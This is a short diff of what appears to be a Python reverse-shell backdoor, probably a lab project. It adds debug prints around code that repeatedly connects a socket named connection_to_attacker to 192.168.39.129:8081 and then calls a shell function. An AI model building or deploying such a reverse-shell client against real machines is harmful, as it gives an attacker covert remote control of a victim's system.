@@ -9,6 +9,7 @@ def reliable_recv():
             continue
 
 def reliable_send(data):
+    print("Reliably Recved")
     json_data = json.dumps(data)
     connection_to_attacker.send(json_data.encode())
 
@@ -37,7 +38,9 @@ def connection():
         #random.randint(5,15)
         time.sleep(5)
         try:
+            print("Trying to send connection to the attacker")
             connection_to_attacker.connect(("192.168.39.129", 8081))
+            print("call To the shell function")
             shell()
             connection_to_attacker.close()
             break
